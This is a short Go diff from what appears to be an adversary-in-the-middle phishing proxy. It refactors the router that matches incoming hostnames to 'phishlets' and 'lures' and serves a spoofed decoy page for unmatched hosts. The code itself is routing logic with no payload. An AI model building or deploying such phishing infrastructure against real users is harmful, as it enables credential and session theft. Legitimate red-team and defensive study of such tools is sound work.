@@ -9,34 +9,32 @@ import (
 	"github.com/travisbale/mirage/internal/proxy"
 )
 
-type hostnameChecker interface {
-	Contains(hostname string) bool
-}
-
-type PhishletResolver interface {
+type phishletResolver interface {
 	ResolveHostname(hostname, urlPath string) (*aitm.Phishlet, *aitm.Lure, error)
 }
 
 type PhishletRouter struct {
-	Hostnames hostnameChecker
-	Resolver  PhishletResolver
-	Spoof     proxy.Spoofer
+	Resolver phishletResolver
+	Spoof    spoofer
 }
 
 func (h *PhishletRouter) Name() string { return "PhishletRouter" }
 
 func (h *PhishletRouter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
 	hostname := hostWithoutPort(strings.ToLower(req.Host))
-	if !h.Hostnames.Contains(hostname) {
-		h.Spoof.ServeHTTP(ctx.ResponseWriter, req)
-		return proxy.ErrShortCircuit
-	}
+
 	phishlet, lure, err := h.Resolver.ResolveHostname(hostname, req.URL.Path)
 	if err != nil {
 		return fmt.Errorf("phishlet_router: resolving %q: %w", hostname, err)
 	}
+	if phishlet == nil {
+		h.Spoof.ServeHTTP(ctx.ResponseWriter, req)
+		return proxy.ErrShortCircuit
+	}
+
 	ctx.Phishlet = phishlet
 	ctx.Lure = lure
+
 	return nil
 }
 
